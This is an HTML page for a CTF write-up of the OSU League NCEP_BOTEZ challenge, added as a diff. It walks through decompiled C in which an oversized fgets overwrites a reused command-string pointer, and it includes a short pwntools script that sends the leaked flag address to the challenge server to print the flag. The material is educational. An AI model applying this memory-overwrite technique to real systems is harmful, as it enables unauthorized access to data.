@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="For this challenge, we are given a binary that is very similar looking to the one from NCEP_XQC. Running the program there is that same GNU chess game that we can interact with, but this time we have no control over the command line arguments, so no injection. Messing around with the program we can see that the only place we have any sort of control is when we make our move:" />
+<meta name="keywords" content=", osuleague, ctf, security" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="/blog/ncep_botez/" />
+
+
+    <title>
+        
+            OSU League 2020/2021 - NCEP_BOTEZ Writeup :: Cameron McCawley 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d1ea4af8fd04fb24a4f8b882ea54bd04eb245427ca4baf527c81a5dab071410b.css">
+
+
+
+
+
+
+<meta itemprop="name" content="OSU League 2020/2021 - NCEP_BOTEZ Writeup">
+<meta itemprop="description" content="For this challenge, we are given a binary that is very similar looking to the one from NCEP_XQC. Running the program there is that same GNU chess game that we can interact with, but this time we have no control over the command line arguments, so no injection. Messing around with the program we can see that the only place we have any sort of control is when we make our move:">
+
+<meta itemprop="wordCount" content="481"><meta itemprop="image" content=""/>
+<meta itemprop="keywords" content="osuleague,ctf,security," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content=""/>
+
+<meta name="twitter:title" content="OSU League 2020/2021 - NCEP_BOTEZ Writeup"/>
+<meta name="twitter:description" content="For this challenge, we are given a binary that is very similar looking to the one from NCEP_XQC. Running the program there is that same GNU chess game that we can interact with, but this time we have no control over the command line arguments, so no injection. Messing around with the program we can see that the only place we have any sort of control is when we make our move:"/>
+
+
+
+    <meta property="og:title" content="OSU League 2020/2021 - NCEP_BOTEZ Writeup" />
+<meta property="og:description" content="For this challenge, we are given a binary that is very similar looking to the one from NCEP_XQC. Running the program there is that same GNU chess game that we can interact with, but this time we have no control over the command line arguments, so no injection. Messing around with the program we can see that the only place we have any sort of control is when we make our move:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/blog/ncep_botez/" /><meta property="og:image" content=""/><meta property="article:section" content="blog" />
+
+<meta property="og:site_name" content="Cameron McCawley" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">cd ~/cameronmccawley</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/blog/">Blog</a></li><li><a href="/resume.pdf">Resume</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="/blog/ncep_botez/">OSU League 2020/2021 - NCEP_BOTEZ Writeup</a></h2>
+
+            
+
+            <div class="post-content">
+                <p>For this challenge, we are given a binary that is very similar looking to the one from NCEP_XQC.
+Running the program there is that same GNU chess game that we can interact with, but this time we have no control over the command line arguments, so no injection. Messing around with the program we can see that the only place we have any sort of control is when we make our move:</p>
+<pre><code>flag loaded at 0x562c0e2e8260
+executing command: /usr/games/gnuchess -g -m
+GNU Chess 6.2.5
+Copyright (C) 2017 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+White (1) : 
+</code></pre><p>We are also given the location in memory of where the flag is loaded in at, which gives us a clue that whatever our payload is going to be must include it. At this point we started to do some static analysis to see where we could exploit something.</p>
+<p>Since there is only one place in the program where we can put in user input, we started our reverse engineering there:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">get_input</span>(<span style="color:#66d9ef">long</span> param_1)
+
+{
+  memset((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x110</span>),<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x100</span>);
+  fgets((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x110</span>),<span style="color:#ae81ff">0x500</span>,stdin);
+  <span style="color:#66d9ef">return</span>;
+}
+</code></pre></div><p>Interseting, it looks like we do an <code>fgets</code> to <code>param_1</code> plus an offset, but <code>param_1</code> is a variable that was passed into this function, so we followed that parameter up to see where it came from. Eventually, we were led to the main function of the program where we can see where it was initilized:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">undefined8 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
+
+{
+  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>__ptr;
+  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>__ptr_00;
+  
+  __ptr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)load_flag();
+  __ptr_00 <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">0x21c</span>);
+  init_game(__ptr_00);
+  printf(<span style="color:#e6db74">&#34;executing command: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)__ptr_00 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x210</span>));
+  launch_gnuchess(__ptr_00);
+  thread_handler(__ptr_00);
+  printf(<span style="color:#e6db74">&#34;finished executing command %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)__ptr_00 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x210</span>));
+  free(__ptr_00);
+  free(__ptr);
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>So now we know that <code>void *__ptr_00</code> is our <code>param_1</code>, but what is interesting here is how much it is being reused. We can see that it is used in the first <code>printf</code> to print the command that was excecuted, but then it gets passed into the <code>thread_handler</code> function, which is what eventually leads to our <code>fgets</code> being called. So the same pointer holding the string of our command is also being used for the <code>fgets</code>. This normally wouldn&rsquo;t be a problem since a null terminator is used to mark the end of a string, but here we see that quite a large buffer was used to allocate this particular char array. Maybe if we fill up that buffer and put the address of our flag in the string, we can make the second <code>printf</code> print the flag. Let&rsquo;s try it out:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> os<span style="color:#f92672">,</span> sys
+
+io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;ctf.ropcity.com&#39;</span>, <span style="color:#ae81ff">31315</span>)
+
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;flag loaded at &#34;</span>)
+addr <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvline(), <span style="color:#ae81ff">16</span>)
+
+flag <span style="color:#f92672">=</span> p64(addr)
+
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;White (1) : &#34;</span>)
+
+payload <span style="color:#f92672">=</span> flag<span style="color:#f92672">*</span><span style="color:#ae81ff">100</span>
+
+io<span style="color:#f92672">.</span>sendline(payload)
+io<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>And running it we get the flag:
+<code>osu{ro$eN_w1LL_not_8e_th1$_4givinG}</code></p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+  				<p>
+  					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="tags/osuleague">osuleague</a></span><span class="tag"><a href="tags/ctf">ctf</a></span><span class="tag"><a href="tags/security">security</a></span>
+  				</p>
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2021</span>
+            
+            
+                <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            
+            <span> <a href="posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.a0f363fdf81cdc5cfacc447a79c33189eb000d090336cd04aac8ee256f423b3133b836c281944c19c75e38d0b0b449f01ce5807e37798b7ac94ac1db51983fc4.js" integrity="sha512-oPNj/fgc3Fz6zER6ecMxiesADQkDNs0EqsjuJW9COzEzuDbCgZRMGcdeONCwtEnwHOWAfjd5i3rJSsHbUZg/xA=="></script>
+
+
+
+
+		
+    </body>
+</html>
